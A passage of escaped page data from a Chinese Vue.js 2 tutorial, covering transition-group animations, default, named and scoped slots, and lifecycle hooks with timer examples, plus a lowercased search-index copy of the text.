  return { displayNow: true };\n  },\n};\n<\/script>\n\n<style>\nh2 {\n  background-color: tomato;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n我们给TodoList案例加上第三方动画库，在新增和删除时，让每一项的进入和离开都具有动画。\n\n<template>\n  <ul class="todo-main">\n    \x3c!-- 要记得引入import "animate.css"，每一项本就有key了   --\x3e\n    <transition-group\n      name="animate__animated animate__bounce"\n      enter-active-class="animate__backInRight"\n      leave-active-class="animate__backOutLeft"\n    >\n      <TodoItem\n        v-for="todo in todos"\n        :key="todo.id"\n        :todoItem="todo"\n      ></TodoItem>\n    </transition-group>\n  </ul>\n</template>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. Vue给我们封装好了过渡与动画，因为原生的css过渡和动画你不好掌握在Vue项目中什么情况下能使用。\n 2. 在插入、更新和移除DOM元素时，在合适的时候给元素加样式类名。\n 3. 准备好样式：\n    1. 元素进入时的样式：\n       * v-enter：进入的起点（进入过程的开始状态）\n       * v-enter-to：进入的终点（进入过程的结束状态）\n       * v-enter-active：进入中（进入过程中使用动效animation或transition）\n    2. 元素离开时的样式：\n       * v-leave：离开的起点（离开过程的开始状态）\n       * v-leave-to：离开的终点（离开过程的结束状态）\n       * v-leave-active：离开中（离开过程中使用动效animation或transition）\n 4. 使用<transition>包裹需要过渡/动画的元素，并配置name属性。\n 5. 若多个元素需要过渡/动画，则需要使用<transition-group>，且同名元素要指定一个key="xxx"。\n\n----------------------------------------\n\n\n# 七、内容分发——插槽\n\n\n# 7.1 默认插槽\n\n复用组件时，我们可能需要使用相同的数据来呈现不同的页面展示形式，你可能会使用type搭配v-if、v-else-if和v-else来实现，例如下面这个例子：\n\nApp4.vue：\n\n<template>\n  <div class="outer">\n    \x3c!-- listData数据相同，传入不同的type来展示不同形状的的页面结构 --\x3e\n    <Category title="美食" :listData="foods" :type="1"></Category>\n    <Category title="美食" :listData="foods" :type="2"></Category>\n    <Category title="美食" :listData="foods" :type="3"></Category>\n  </div>\n</template>\n\n<script>\nimport Category from "./components/Category.vue";\nexport default {\n  name: "App4",\n  components: { Category },\n  data() {\n    return {\n      foods: ["火锅", "烧烤", "麻辣烫"],\n    };\n  },\n};\n<\/script>\n<style scoped>\n.outer {\n  display: flex;\n  justify-content: space-around;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\nCategory.vue：\n\n<template>\n  <div class="inner">\n    <h2 class="title">{{ title }}</h2>\n    \x3c!-- type搭配v-if、v-else-if和v-else来决定展示什么样的自定义内容 --\x3e\n    <ul v-if="type === 1">\n      <li v-for="(item, index) in listData" :key="index">{{ item }}</li>\n    </ul>\n    <ol v-else-if="type === 2">\n      <li v-for="(item, index) in listData" :key="index">{{ item }}</li>\n    </ol>\n    <div v-else>\n      <h4 v-for="(item, index) in listData" :key="index">{{ item }}</h4>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Category",\n  props: ["title", "listData", "type"],\n};\n<\/script>\n\n<style scoped>\n.inner {\n  width: 25%;\n  height: 350px;\n  background-color: darkcyan;\n}\n.title {\n  text-align: center;\n  background-color: darkorange;\n}\nh4 {\n  text-align: center;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n\n\n我们可以使用默认插槽来优化修改上面的代码。插槽的作用就是将父组件传来的自定义内容（自定义结构）插入到子组件的<slot>里（内容分发）。“自定义内容”，可以有普通文本，也可以有自己编写的散乱的模板代码，也可以有<template>包裹的模板代码，也可以有自定义组件。\n\n\x3c!-- 在子组件调用标签里（不是子组件定义处），写上自定义内容，\n最后内容会被分发到子组件内部（子组件定义处）里面的插槽处（插到插槽里） --\x3e\n<navigation-link>\n  \x3c!-- 自定义内容开始 --\x3e\n  \x3c!-- span元素和“hello”形成的是散乱的模板代码 --\x3e\n  <span class="fa">{{name，}}</span>\n  hello\n  \x3c!-- 自定义内容结束 --\x3e\n</navigation-link>\n<navigation-link>\n  \x3c!-- 自定义内容开始 --\x3e\n  \x3c!-- 自定义组件font-awesome-icon，它也会被分发到navigation-link组件内部 --\x3e\n  <font-awesome-icon name="user"></font-awesome-icon>\n  hello\n  \x3c!-- 自定义内容结束 --\x3e\n</navigation-link>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n修改开头的例子：\n\n * 先将子组件内部的type和v-if适配代码全部去掉，然后使用插槽<slot></slot>来占住之前适配代码所在位置，最后就等待父组件传来自定义内容的插入。相当于在子组件内部挖了一个坑，等着父组件根据不同的情况将自定义内容传过来填坑。\n * 处理好子组件内部后，在父组件这边，需要将自定义内容（自定义结构），放到父组件里的子组件调用标签内。具体是先将<TodoList/>打开成<TodoList>和</TodoList>，再把自定义内容放入<TodoList>和</TodoList>之间。\n\n以上两步过后，Vue在解析父组件模板时，也会将<TodoList>和</TodoList>之间的自定义结构进行解析；到了子组件模板开始解析时，会把刚刚解析好的内容放到<slot></slot>。这就是使用不同的自定义内容，展示到子组件里，也叫做内容分发。上面例子经过插槽优化修改后的代码如下：\n\nApp4.vue：\n\n<template>\n  <div class="outer">\n    <Category title="美食">\n      \x3c!--将不同的自定义结构（ul-li）插入到子组件的插槽里，其实数据都是一样的 --\x3e\n      <ul>\n        <li v-for="(item, index) in foods" :key="index">{{ item }}</li>\n      </ul>\n    </Category>\n    <Category title="美食">\n      \x3c!--将不同的自定义结构（ol-li）插入到子组件的插槽里，其实数据都是一样的 --\x3e\n      <ol>\n        <li v-for="(item, index) in foods" :key="index">{{ item }}</li>\n      </ol>\n    </Category>\n    <Category title="美食">\n      \x3c!--将不同的自定义结构（ul-h4）插入到子组件的插槽里，其实数据都是一样的 --\x3e\n      <div>\n        <h4 v-for="(item, index) in foods" :key="index">{{ item }}</h4>\n      </div>\n    </Category>\n  </div>\n</template>\n\n<script>\nimport Category from "./components/Category.vue";\nexport default {\n  name: "App4",\n  components: { Category },\n  data() {\n    return {\n      foods: ["火锅", "烧烤", "麻辣烫"],\n    };\n  },\n};\n<\/script>\n<style scoped>\n.outer {\n  display: flex;\n  justify-content: space-around;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\nCategory.vue：\n\n<template>\n  <div class="inner">\n    <h2 class="title">{{ title }}</h2>\n    \x3c!-- 承接父组件传来的自定义内容。它属于默认插槽，也就是没有name --\x3e\n    <slot>我是插槽的后备内容，如果有自定义内容传过来，此处就会被它替代</slot>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Category",\n  props: ["title"],\n};\n<\/script>\n\n<style scoped>\n.inner {\n  width: 25%;\n  height: 350px;\n  background-color: darkcyan;\n}\n.title {\n  text-align: center;\n  background-color: darkorange;\n}\nh4 {\n  text-align: center;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n看完上面例子，是父组件将不同的自定义结构传递给了子组件，只是不是通过以往的props传参方式，而是通过在子组件设置插槽的方式进行插入自定义结构的。只要区分一个是传值，一个是传自定义结构（非值，一般是模板代码或者组件）。\n\n还有两个注意点：\n\n * 如果没有在子组件里使用slot标签，也就是没有设置插槽地点，父组件的自定义内容就会被抛弃。\n * 如果在子组件里使用了slot标签，但是没有在父组件自定义内容，那么slot标签体的内容会显示在子组件里，它是一个后备内容（与函数的形参默认值类似）。\n\n\n# 7.2 具名插槽\n\n默认插槽没有带name属性（其实默认带了，即name="default"），一般都默认将自定义html内容插入到这个默认插槽里。其实是可以使用多个插槽的，需要在<slot>里使用name="xxx"属性进行区分（定义插槽名），这种插槽叫做具名插槽。具名插槽主要是为了在子组件内部使用多个插槽，将不同的内容分发到子组件内不同的位置。\n\n在子组件里的插槽使用name="xxx"进行区分，而在父组件的自定义内容这边：\n\n 1. 如果自定义内容没有使用<template>进行包裹也不是自定义组件（普通元素），那就使用slot="xxx"加到普通元素上，xxx是插槽名。\n 2. 如果自定义内容使用了<template>进行包裹，或者是一个组件定组件，那就使用v-slot:xxx加到<template>标签或者自定义组件标签里，xxx是插槽名。\n 3. 注意，v-slot只能添加在<template>或者自定义组件标签里，不能用在普通的元素上。\n 4. v-slot:xxx，是可以进行缩写的，即v-slot:xxx缩写为#xxx，这个xxx是插槽名。\n 5. 那默认插槽呢？你都没名字，再用slot="xxx"或v-slot:xxx就没有意义了。如果你非要加slot="default"或v-slot:default或#default，就可以加到子组件调用标签里（子组件也是组件，所以可用v-slot）。就不是加到自定义内容本身了，这容易引起歧义，最好不要这么做！！！\n\nApp4.vue：\n\n<template>\n  <div class="outer">\n    \x3c!-- 这里还可以是#default，其实没什么必要加。因为Category内部自定义内容如果不\n    加slot="xxx"或#xxx，就表示Category内部整个自定义内容都插入到默认插槽了 --\x3e\n    <Category title="美食" slot="default">\n      \x3c!-- 普通元素就加slot="xxx"，比如这里可以是slot="content" --\x3e\n      <img\n        src="https://t7.baidu.com/it/u=760837404,2640971403&fm=193&f=GIF"\n      />\n      \x3c!-- 普通元素就加slot="xxx"，比如这里可以是slot="footer" --\x3e\n      <a href="http://">更多美食</a>\n    </Category>\n\n    <Category title="游戏">\n      \x3c!-- 使用了模板标签，那就用v-slot: content，还可缩写为#content。将它插入到名为content的插槽里 --\x3e\n      <template #content>\n        <ul>\n          <li v-for="(item, index) in games" :key="index">{{ item }}</li>\n        </ul>\n        <div class="foot">\n          <a href="http://">单机游戏</a>\n          <a href="http://">网络游戏</a>\n        </div>\n      </template>\n    </Category>\n\n    <Category title="电影">\n      \x3c!-- 没有用模板语法也不是自定义组件，而是普通元素，那就加slot="content"。将它插入到名为content的插槽里 --\x3e\n      <video\n        slot="content"\n        controls\n        src="http://pgc.qcdn.xiaodutv.com/1491690018_136852136_2021022300080220210223005108.mp4"\n      ></video>\n      \x3c!-- 没有用模板语法也不是自定义组件，而是普通元素，那就加slot="foot"。将它插入到名为foot的插槽里 --\x3e\n      <div class="foot" slot="footer">\n        <a href="http://">经典</a>\n        <a href="http://">热门</a>\n        <a href="http://">推荐</a>\n      </div>\n      \x3c!-- 没有用模板语法也不是自定义组件，而是普通元素，那就加slot="foot"。将它插入到名为foot的插槽里 --\x3e\n      \x3c!-- 可以将多个内容放到同一个插槽里，不会被覆盖，只会进行追加。追加到footer插槽里了。 --\x3e\n      <h4 slot="footer">欢迎来到影院</h4>\n    </Category>\n  </div>\n</template>\n\n<script>\nimport Category from "./components/Category.vue";\nexport default {\n  name: "App4",\n  components: { Category },\n  data() {\n    return {\n      foods: ["火锅", "烧烤", "麻辣烫"],\n      games: ["王者荣耀", "英雄联盟", "绝地求生"],\n      movies: ["头文字D", "不能说的秘密", "我不是药神"],\n    };\n  },\n};\n<\/script>\n<style scoped>\n.outer,\n.foot {\n  display: flex;\n  justify-content: space-around;\n}\nimg,\nvideo {\n  width: 100%;\n}\nh4 {\n  text-align: center;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n\n\nCategory.vue：\n\n<template>\n  <div class="inner">\n    <h2 class="title">{{ title }}</h2>\n    \x3c!-- 多个插槽使用name进行区分，这叫做具名插槽 --\x3e\n    <slot name="default">我是content插槽的后备内容</slot>\n    <slot name="content">我是content插槽的后备内容</slot>\n    <slot name="footer">我是footer插槽的后备内容</slot>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Category",\n  props: ["title", "listData"],\n};\n<\/script>\n\n<style>\n.inner {\n  width: 25%;\n  height: 350px;\n  background-color: darkcyan;\n}\n.title {\n  text-align: center;\n  background-color: darkorange;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n父组件可以使用多个同插槽名的自定义内容，最终会将这些同名的自定义内容放到了同一个插槽里面（比如上例里的第三个Category组件）。如果想把多个自定义内容放一起但又不想多包一层div，可以使用<template #xxx>模板进行包裹（（比如上例里的第二个Category组件））。\n\n\n# 7.3 作用域插槽\n\n我们可以继续观察默认插槽里的例子，那个listData数据是在父组件里的，如果实际开发中数据就存在于子组件里，并且因为历史原因还不容易移到父组件上去的话，这该如何进行优化修改呢？\n\n插槽还有一种作用于插槽，可以从子组件插槽这里将数据传递给父组件的自定义内容处，这个就比较奇特了。父组件将“结构”传给子组件之前反而子组件将你需要的数据反传过来了。这种方式称为插槽prop，这和父子props方式类似，但插槽prop最后并没有将数据添加到父组件实例上，它的作用域仅限于那个自定义内容那块范围（name那块的<template>内部），这点得与props区分开。\n\n作用域插槽的具体使用：\n\n 1. 在<slot>标签里使用类似props的传参方式，也就是使用属性（静态传递或动态绑定后传递都可）。\n 2. 父组件里自定义内容处（）：\n    1. 无论是默认插槽还是具名插槽，只要自定义内容是<template>包裹或者是自定义组件，那就可以在<template>标签或者自定义组件调用标签里，加上#xxx="yyy"，xxx是插槽名（name值），yyy是传参对象（通过插槽prop传来的所有参数集中在该对象上）。\n    2. 如果只是默认插槽，自定义内容也没有用<template>包裹也不是自定义组件，那么可以将#default="yyy"直接加到子组件调用标签里，yyy是传参对象。\n    3. 没有普通元素的场景，无法将#xxx="yyy"加到普通元素上，这是作用域插槽这不是具名插槽（加作用域和加名字不一样）。这是因为作用域插槽除了刚刚第二种场景以外，就只能用在<template>这种场景下了。\n    4. 我们并没有介绍name="xxx" scope="yyy"的写法，这是2.6版本以前的写法，除非遇到老项目要维护，不推荐使用老写法了。这种老写法也不能加到普通元素上了，老老实实使用<template>方式吧！！！\n 3. 子组件插槽传参的话，比如这边是<slot :foods="foods" name="xxx">，那边得是<template #xxx="yyy">。注意，yyy并不就是foods了，这个foods传过来后它只是yyy上的一个属性，也就是说使用yyy.foods才能取到想要值。这个yyy传参对象，是包含了所有的插槽传参属性，所以你还能使用对象的解构。\n\n将第一节的例子进行修改，把listData数据放到Category组件内，使用插槽prop将数据传给自定义内容，自定义内容使用#xxx="yyy"进行接收。\n\nApp4.vue：\n\n<template>\n  <div class="outer">\n    <Category title="美食">\n      \x3c!-- 一般场景，而且一般都是具名插槽。在template标签里加上了`#default="param"` --\x3e\n      <template #default="param">\n        <ul>\n          \x3c!-- foods只是param对象里的一个属性 --\x3e\n          <li v-for="(item, index) in param.foods" :key="index">{{ item }}</li>\n        </ul>\n      </template>\n    </Category>\n    \x3c!-- 该场景仅限于默认插槽。在子组件Category标签里加上了`#default="param"`，这是个特例，域插槽几乎只用在template上 --\x3e\n    <Category title="美食" #default="param">\n      \x3c!-- 千万不在ol标签里加上`#default="param"`，一是因为v-slot之能用在template上，二是因为就算你使\n      用老写法`slot="default" scope="param"`也不行，因为作用域插槽几乎只用在template上，不会用在普通元素上 --\x3e\n      <ol>\n        \x3c!-- foods只是param对象里的一个属性 --\x3e\n        <li v-for="(item, index) in param.foods" :key="index">{{ item }}</li>\n      </ol>\n    </Category>\n    <Category title="美食">\n      \x3c!-- 一般场景，而且一般都是具名插槽。在template标签里加上了`#default="param"` --\x3e\n      <template #default="param">\n        <div>\n          \x3c!-- foods只是param对象里的一个属性 --\x3e\n          <h4 v-for="(item, index) in param.foods" :key="index">{{ item }}</h4>\n        </div>\n      </template>\n    </Category>\n  </div>\n</template>\n\n<script>\nimport Category from "./components/Category.vue";\nexport default {\n  name: "App4",\n  components: { Category },\n};\n<\/script>\n<style scoped>\n.outer {\n  display: flex;\n  justify-content: space-around;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n\n\nCategory.vue：\n\n<template>\n  <div class="inner">\n    <h2 class="title">{{ title }}</h2>\n    \x3c!-- 这是默认的作用域插槽，将数据传给了各个自定义内容处 --\x3e\n    <slot :foods="foods"></slot>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "Category",\n  props: ["title"],\n  // 对比默认插槽，数据从父组件移到了子组件内部\n  // 如果外界想用，就通过类似props方式传出去\n  data() {\n    return {\n      foods: ["火锅", "烧烤", "麻辣烫"],\n    };\n  },\n};\n<\/script>\n\n<style scoped>\n.inner {\n  width: 25%;\n  height: 350px;\n  background-color: darkcyan;\n}\n.title {\n  text-align: center;\n  background-color: darkorange;\n}\nh4 {\n  text-align: center;\n}\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 插槽的作用：让父组件可以向子组件指定位置插入自定义内容（将自定义结构传到子组件内部），也是一种组件间通信的方式，适用于父===>子。\n\n 2. 插槽分类：默认插槽、具名插槽、作用于插槽。\n\n 3. 默认插槽的使用：\n    \n    \x3c!-- 父组件，将自定义内容传递给子组件，也就是插入到子组件插槽处 --\x3e\n    <Category>\n      <div>这个div就是一个自定义内容（自定义结构）</div>\n    </Category>\n    \x3c!-- 子组件，使用插槽<slot>来承接自定义内容 --\x3e\n    <template>\n      <div>\n        <div>子组件其他内容</div>\n        \x3c!-- 默认插槽没有名字，其实有name="default"的默认名字 --\x3e\n        <slot>这是一个默认插槽</slot>\n      </div>\n    </template>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n 4. 具名插槽的使用：\n    \n    \x3c!-- 父组件里的自定义内容，使用slot="xxx"区分 --\x3e\n    <Category>\n      \x3c!-- 普通元素的场景，使用slot="center" --\x3e\n      <div slot="center">这个div就是一个自定义内容（自定义结构）</div>\n      \x3c!-- 用<template>进行了包裹的场景，那就在template标签里使用#footer（全写是v-slot:footer） --\x3e\n      <template #footer>\n        <div>这个div就是一个自定义内容（自定义结构）</div>\n      </template>\n    </Category>\n    \x3c!-- 子组件，使用name="xxx"，主要是为了分区 --\x3e\n    <template>\n      <div>\n        <div>子组件其他内容</div>\n        \x3c!-- 具名插槽，名字是"center" --\x3e\n        <slot name="center">这是一个具名插槽</slot>\n        \x3c!-- 具名插槽，名字是"footer" --\x3e\n        <slot name="footer">这是一个具名插槽</slot>\n      </div>\n    </template>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    \n\n 5. 作用域插槽的使用（关键数据在子组件中）：\n    \n    \x3c!-- 父组件里的自定义内容，如果在具名插槽下就必须使用template进行包裹 --\x3e\n    <Category>\n      <template #footer="param">\n        <ul>\n          \x3c!-- param是参数对象，foods只是它其中的一个属性 --\x3e\n          <li v-for="(item, index) in param.foods" :key="index">{{ item }}</li>\n        </ul>\n      </template> \n    </Category>\n    \x3c!-- 父组件里的自定义内容，如果是默认插槽可以将#default="param"写到子组件标签里 --\x3e\n    <Category #default="param">\n      \x3c!-- 可以改成上面那种，使用默认插槽式的作用域插槽很容易让人犯糊涂 --\x3e\n      <ol>\n        \x3c!-- param是参数对象，games只是它其中的一个属性 --\x3e\n        <li v-for="(item, index) in param.games" :key="index">{{ item }}</li>\n      </ol>\n    </Category>\n    \x3c!-- 子组件，使用了插槽porps对父组件的自定义内容进行了传参 --\x3e\n    <template>\n      <div>\n        <div>子组件其他内容</div>\n        <slot :games="games">这是一个作用域插槽插槽</slot>\n        <slot name="footer" :foods="foods">这是一个作用域插槽插槽</slot>\n      </div>\n    </template>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    \n\n----------------------------------------',normalizedContent:'# vue进阶\n\n\n# 一、vue实例生命周期\n\n\n# 1.1 这个定时器要放哪\n\n我们经常使用定时器来控制页面展示效果，那么这个定时器应该放到哪里呢？我们可以看下面这个例子。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2 :style="{opacity}">你好，{{name}}</h2>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: { name: \'张三\', opacity: 1 },\n        });\n        setinterval(() => {\n            vm.opacity -= 0.1\n            if (vm.opacity <= 0) vm.opacity = 1;\n        }, 100);\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n上面例子里的定时器放在了vm实例创建完之后，这会有什么问题呢？定时器与vm实例在代码层面是割裂开的，但是功能是有联系的，这符合一般的开发规范。那我们得考虑将定时器放到vm实例里，那放在methods里吗？methods里的方法一般是充当事件回调函数的，如果你非要新建一个方法包裹setinterval定时器，那还得对应在模板里主动调用这个新方法，代码如下，运行效果不符合预期。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2 :style="{opacity}">你好，{{name}}</h2>\n        <h2>{{change()}}</h2>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\',\n                opacity: 1\n            },\n            methods: {\n                change() {\n                    setinterval(() => {\n                        console.log(\'定时器\');\n                        this.opacity -= 0.1\n                        if (this.opacity <= 0) this.opacity = 1;\n                    }, 100);\n                }\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n上面例子的运行效果不符合预期，这是因为定时器里做了data存储数据的修改（vm.opacity = xxx），会导致模板一直重新解析，那就一直会调用change。\n\n我们的期望是只让change始终值只调用一次，在真实dom第一次被放到页面时调用它，在之后的模板重新解析时不再调用它，那这就不得不用到vue的声明周期函数。mounted就是vue生命周期函数中的一个，在vue完成模板解析并真实dom元素放入页面后回调mounted，也就说mounted只在挂载后调用一次，在后面每次更新都不会再被调用了。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2 :style="{opacity}">你好，{{name}}</h2>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\',\n                opacity: 1\n            },\n            // mounted生命周期函数，在vue完成模板解析并真实dom元素放入页面后被调用（挂载后）\n            mounted() {\n                setinterval(() => {\n                    console.log(\'定时器\');\n                    this.opacity -= 0.1\n                    if (this.opacity <= 0) this.opacity = 1;\n                }, 100);\n            },\n        });\n    <\/script>\n</body>\n</html>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n----------------------------------------\n\n总结拓展：\n\n 1. 生命周期函数：vue在关键时刻帮我们调用的一些特殊名称的函数。\n 2. 生命周期函数又名生命周期回调函数或生命周期钩子。\n 3. 生命周期函数的方法名是固定的不可更改的，方法体内容根据开发需求自行修改。\n 4. 生命周期函数中的this指向是vm或组件实例对象。\n\n----------------------------------------\n\n\n# 1.2 挂载流程\n\n\n\n挂载流程：\n\n 1. init events & lifecycle阶段：规定vue的生命周期函数有多少个、在什么时候调用，还规定了事件与事件修饰符的怎么运行。该阶段还未进行数据处理。该阶段紧跟其后的一个生命周期函数是beforecreate()，该生命周期函数中还无法通过vm访问到data中的数据、methods中的方法。\n    \n    <!doctype html>\n    <html lang="en">\n    <head>\n        <meta charset="utf-8">\n        <title>document</title>\n        <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    </head>\n    <body>\n        <div id="root">\n            <h2>你好，{{name}}</h2>\n            <button @click="change">点击我</button>\n        </div>\n        <script type="text/javascript">\n            vue.config.productiontip = false;\n            const vm = new vue({\n                el: \'#root\',\n                data: {\n                    name: \'张三\'\n                },\n                // beforecreate生命钩子：无法通过vm访问到data中的数据、methods中的方法。\n                beforecreate() {\n                    console.log(\'尝试访问data数据\', this.name, this._data);\n                    console.log(\'尝试访问methods方法\', this.add);\n                    debugger;\n                },\n                methods: {\n                    change() { this.name = \'李四\'; }\n                },\n            });\n        <\/script>\n    </body>\n    </html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    \n\n 2. init injections & reactivity阶段：处理了依赖注入等，并对存储数据做了数据监视和数据代理。该阶段紧跟其后的一个生命周期函数是created()，该生命周期函数中可以通过vm访问到data中的数据、methods中的方法。\n    \n    <!doctype html>\n    <html lang="en">\n    <head>\n        <meta charset="utf-8">\n        <title>document</title>\n        <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n    </head>\n    <body>\n        <div id="root">\n            <h2>你好，{{name}}</h2>\n            <button @click="change">点击我</button>\n        </div>\n        <script type="text/javascript">\n            vue.config.productiontip = false;\n            const vm = new vue({\n                el: \'#root\',\n                data: {\n                    name: \'张三\'\n                },\n                // created生命钩子：可以通过vm访问到data中的数据、methods中的方法。\n                created() {\n                    console.log(\'尝试访问data数据\', this.name, this._data);\n                    console.log(\'尝试访问methods方法\', this.add);\n                    debugger;\n                },\n                methods: {\n                    change() { this.name = \'李四\'; }\n                },\n            });\n        <\/script>\n    </body>\n    </html>\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    24\n    25\n    26\n    27\n    28\n    29\n    30\n    31\n    32\n    \n\n 3. 模板解析阶段：开始解析模板生成虚拟dom存储在内存中，还未生成对应的真实dom。该阶段紧跟其后的一个生命周期函数是beforemount()，在此生命钩子中对应页面的展示还是模板内容，虽然虚拟dom生成了，但真实dom还未加到页面中，所以不要在此生命钩子中操作真实dom。\n    \n\n 4. create vm.$el and replace "el" with it阶段：将虚拟dom转换成真实dom，并将真实dom存储在vm.$el，然后将真实dom插入了页面。该阶段紧跟其后的一个生命周期函数是mounted()，在此生命钩子中对应页面的展示已经是真实dom了，可以进行真实dom操作（不建议），也可以开启定时器、发送网络请求、订阅消息、绑定自定义事件等初始化操作。\n    \n\n\n# 1.3 更新流程\n\n\n\n更新流程比较简单，当data存储数据改变时就去更新页面。virtual dom re-renderand patch阶段：生成新的虚拟dom，再与旧的虚拟dom进行比较，根据比较结果更新页面。该阶段前有个生命周期函数是beforeupdate()，data存储数据是新的，但页面还是旧的。该阶段后有个生命周期函数是updated()，data存储数据是新的，页面也是新的。\n\n<!doctype html>\n<html lang="en">\n<head>\n    <meta charset="utf-8">\n    <title>document</title>\n    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.14/dist/vue.js"><\/script>\n</head>\n<body>\n    <div id="root">\n        <h2>你好，{{name}}</h2>\n        <button @click="change">点击我</button>\n    </div>\n    <script type="text/javascript">\n        vue.config.productiontip = false;\n        const vm = new vue({\n            el: \'#root\',\n            data: {\n                name: \'张三\'\n            },\n            // beforeupdate生命钩子：数据是新的，但页面是旧的，即页面尚未和数据保持同步。\n            beforeupdate() {\n                console.log(\'data数据是新的：\', this.name);\n                console.log(\'页面是旧的\', document.getelementsbytagname(\'h2\')[0].innertext);\n                debugger;\n            },\n            // updated生命钩子：数据是新的，页面也是新的，即页面和数据保持同步。\n            updated() {\n                console.log(\'data数据是新的：\', this.name);\n                console.log(\'页面也是新的\', document.getelementsbytagname(\'h2\')[0].innertext);\n                debugger;\n            },\n            methods: {\n                change() {\n                    this.name = \'李四\';\n                }\n            },\n        });\n    